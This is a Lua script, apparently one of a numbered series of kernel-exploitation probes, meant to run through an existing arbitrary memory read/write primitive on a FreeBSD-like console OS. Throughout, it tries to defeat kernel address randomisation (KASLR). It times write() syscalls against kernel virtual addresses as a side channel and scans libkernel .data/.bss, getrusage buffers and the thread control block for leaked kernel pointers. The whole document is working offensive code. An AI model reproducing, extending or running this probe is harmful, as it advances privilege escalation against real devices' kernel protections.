-- CRASH_CLASS: MODERATE
-- PROBE 56j: High-resolution timing KASLR + libkernel .bss scan
--
-- Context: sys 624 is useless as timer (VM op counter, all deltas 0).
-- Need clock_gettime(232) for nanosecond resolution.
-- Also: libkernel .data was scanned but .bss may be separate and unscanned.
--
-- Plan:
--   [B] clock_gettime(232) — get nanosecond timer working
--   [C] Timing probe: write() to kernel VA vs userland vs unmapped
--   [D] Scan libkernel full memory range (text end → data end = covers .bss)
--   [E] Scan between modules — gaps may contain loader-allocated structs
--   [F] Try getrusage(117) — may return kernel timing info

print("=== PROBE 56j: TIMING KASLR + BSS SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    -- True kernel pointer: hi in kernel range AND lo looks like real address
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF and l >= 0x100000
end
local function is_any_kernel(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] clock_gettime(232) — nanosecond timer
-- struct timespec { time_t tv_sec; long tv_nsec; }
-- CLOCK_MONOTONIC = 4, CLOCK_REALTIME = 0
-- ============================================================
print("")
print("[B] clock_gettime setup")

local sc_clock = make_syscall(232)
local ts = memory.alloc(16)

local function get_ns()
    safe_wq(ts, uint64(0))
    safe_wq(ts + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts)) end)  -- CLOCK_MONOTONIC
    local sec = safe_rd(ts) or 0
    local nsec = safe_rd(ts + 8) or 0
    return sec * 1000000000 + nsec
end

-- Test it
local t1 = get_ns()
local t2 = get_ns()
local t3 = get_ns()
print(string.format("  t1=%d t2=%d t3=%d", t1, t2, t3))
print(string.format("  delta1=%d ns  delta2=%d ns", t2 - t1, t3 - t2))

if t1 == 0 and t2 == 0 then
    print("  clock_gettime FAILED — trying CLOCK_REALTIME")
    local function get_ns_rt()
        safe_wq(ts, uint64(0))
        safe_wq(ts + 8, uint64(0))
        pcall(function() sc_clock(uint64(0), uint64(ts)) end)
        local sec = safe_rd(ts) or 0
        local nsec = safe_rd(ts + 8) or 0
        return sec * 1000000000 + nsec
    end
    t1 = get_ns_rt()
    t2 = get_ns_rt()
    print(string.format("  RT: t1=%d t2=%d delta=%d", t1, t2, t2 - t1))
    if t1 > 0 then
        get_ns = get_ns_rt
    end
end

-- ============================================================
-- [C] Timing probe — write() with kernel VA
-- Average over many iterations to get signal above noise
-- ============================================================
print("")
print("[C] Timing probe")

local sc_write = make_syscall(4)
local test_buf = memory.alloc(64)
safe_wd(test_buf, 0x41)

-- Measure valid write
local ITERS = 100
local sum_valid = 0
for i = 1, ITERS do
    local ta = get_ns()
    pcall(function() sc_write(uint64(1), uint64(test_buf), uint64(1)) end)
    local tb = get_ns()
    sum_valid = sum_valid + (tb - ta)
end
print(string.format("  write(valid) avg=%d ns", sum_valid / ITERS))

-- Measure unmapped write
local sum_unmap = 0
for i = 1, ITERS do
    local ta = get_ns()
    pcall(function() sc_write(uint64(1), uint64("0x7DEAD0000000"), uint64(1)) end)
    local tb = get_ns()
    sum_unmap = sum_unmap + (tb - ta)
end
print(string.format("  write(unmapped) avg=%d ns", sum_unmap / ITERS))

-- Measure kernel VA writes
local kvas = {
    {name="0xFFFF800000000000", addr="0xFFFF800000000000"},
    {name="0xFFFF800040000000", addr="0xFFFF800040000000"},
    {name="0xFFFFFFFF80000000", addr="0xFFFFFFFF80000000"},
    {name="0xFFFFFFFF80200000", addr="0xFFFFFFFF80200000"},
    {name="0xFFFFFFFF82000000", addr="0xFFFFFFFF82000000"},
    {name="0xFFFFFFFF84000000", addr="0xFFFFFFFF84000000"},
}

for _, kv in ipairs(kvas) do
    local sum_k = 0
    for i = 1, ITERS do
        local ta = get_ns()
        pcall(function() sc_write(uint64(1), uint64(kv.addr), uint64(1)) end)
        local tb = get_ns()
        sum_k = sum_k + (tb - ta)
    end
    print(string.format("  write(%s) avg=%d ns", kv.name, sum_k / ITERS))
end

-- ============================================================
-- [D] Scan libkernel FULL range (text through data+bss)
-- text base → data base + data size covers everything
-- ============================================================
print("")
print("[D] libkernel full range scan (text→data end)")

local sc_info = make_syscall(593)
local lk_info = memory.alloc(0x200)
safe_wd(lk_info, 0x160)
pcall(function() sc_info(uint64(0x2001), lk_info) end)

local lk_text_lo = safe_rd(lk_info + 0x108) or 0
local lk_text_hi = safe_rd(lk_info + 0x10C) or 0
local lk_text_sz = safe_rd(lk_info + 0x110) or 0
local lk_data_lo = safe_rd(lk_info + 0x118) or 0
local lk_data_hi = safe_rd(lk_info + 0x11C) or 0
local lk_data_sz = safe_rd(lk_info + 0x120) or 0

print(string.format("  text: 0x%X_%08X +0x%X", lk_text_hi, lk_text_lo, lk_text_sz))
print(string.format("  data: 0x%X_%08X +0x%X", lk_data_hi, lk_data_lo, lk_data_sz))

-- The gap between text end and data start might contain .rodata, .bss
local text_end_lo = lk_text_lo + lk_text_sz
local text_end_hi = lk_text_hi
if text_end_lo >= 0x100000000 then text_end_hi = text_end_hi + 1; text_end_lo = text_end_lo - 0x100000000 end

local data_end_lo = lk_data_lo + lk_data_sz
local data_end_hi = lk_data_hi
if data_end_lo >= 0x100000000 then data_end_hi = data_end_hi + 1; data_end_lo = data_end_lo - 0x100000000 end

print(string.format("  text end: 0x%X_%08X", text_end_hi, text_end_lo))
print(string.format("  data end: 0x%X_%08X", data_end_hi, data_end_lo))

-- Scan gap between text end and data start
local gap_start_h, gap_start_l = text_end_hi, text_end_lo
local gap_kptrs = 0

-- Scan from text end to data start (the .rodata/.bss gap)
-- But be careful — text is XO so reading it crashes! Only read RO/RW pages
-- Start from data base and go PAST data_sz to find .bss
-- .bss follows .data and might extend beyond reported data_sz
local bss_scan_extra = 0x20000  -- scan 128KB past data end
local bss_kptrs = 0

for off = 0, lk_data_sz + bss_scan_extra - 1, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val == nil then
        -- Hit unmapped page — stop extending
        if off > lk_data_sz then
            print(string.format("  .bss ends at data+0x%X (unmapped)", off))
            break
        end
    elseif is_kptr(val) then
        bss_kptrs = bss_kptrs + 1
        if bss_kptrs <= 20 then
            local region = off < lk_data_sz and ".data" or ".bss"
            print(string.format("  %s+0x%05X: %s", region, off, hexval(val)))
        end
    end
end
print(string.format("  libkernel data+bss kptrs (true): %d", bss_kptrs))

-- ============================================================
-- [E] getrusage(117) — process resource usage from kernel
-- May contain timing info or kernel-side pointers
-- ============================================================
print("")
print("[E] getrusage")

local sc_rusage = make_syscall(117)
local rubuf = memory.alloc(0x100)
for i = 0, 0x3F do safe_wd(rubuf + i*4, 0) end

-- RUSAGE_SELF = 0
local rok, rret = pcall(function() return sc_rusage(uint64(0), uint64(rubuf)) end)
local r_ret = rok and to_num(rret) or -999
print("  ret=" .. r_ret)

if r_ret == 0 then
    -- Scan for kernel pointers
    for off = 0, 0xF0, 8 do
        local val = safe_rq(rubuf + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                local tag = ""
                if is_any_kernel(val) then tag = " KRANGE!" end
                if is_kptr(val) then tag = " KPTR!" end
                if off < 32 or tag ~= "" or vl > 0 then
                    print(string.format("  +0x%02X: %s%s", off, hexval(val), tag))
                end
            end
        end
    end
end

-- ============================================================
-- [F] Try reading the thread control block (TCB)
-- sysarch GET_FSBASE returned 0x88xxxxxxxx (userland)
-- But the TCB struct itself may contain kernel pointers
-- ============================================================
print("")
print("[F] TCB/FS_BASE deep scan")

local sc_sysarch = make_syscall(165)
local fsbase_buf = memory.alloc(16)
safe_wq(fsbase_buf, uint64(0))

-- GET_FSBASE = 129... no that's SET. GET_FSBASE = 128
local saok, saret = pcall(function()
    return sc_sysarch(uint64(128), uint64(fsbase_buf))
end)
local sa_ret = saok and to_num(saret) or -999
local fsbase = safe_rq(fsbase_buf)
print(string.format("  sysarch(128) ret=%d fsbase=%s", sa_ret, hexval(fsbase)))

if fsbase and sa_ret == 0 then
    local fh, fl = get_hi_lo(fsbase)
    if fh > 0 or fl > 0 then
        -- Scan TCB structure (typically ~0x100 bytes)
        print("  TCB scan:")
        local tcb_kptrs = 0
        for off = -0x100, 0x200, 8 do
            local a_l = fl + off
            local a_h = fh
            if a_l < 0 then a_h = a_h - 1; a_l = a_l + 0x100000000 end
            if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
            local addr_ok, val = pcall(function()
                return memory.read_qword(uint64(string.format("0x%X%08X", a_h, a_l)))
            end)
            if addr_ok and val then
                if is_kptr(val) then
                    tcb_kptrs = tcb_kptrs + 1
                    print(string.format("    FS%+d: %s KPTR!", off, hexval(val)))
                elseif is_any_kernel(val) then
                    local vh, vl = get_hi_lo(val)
                    print(string.format("    FS%+d: %s KRANGE", off, hexval(val)))
                end
            end
        end
        print("  TCB kptrs: " .. tcb_kptrs)
    end
end

collectgarbage("restart")

print("")
print("=== PROBE 56j COMPLETE ===")
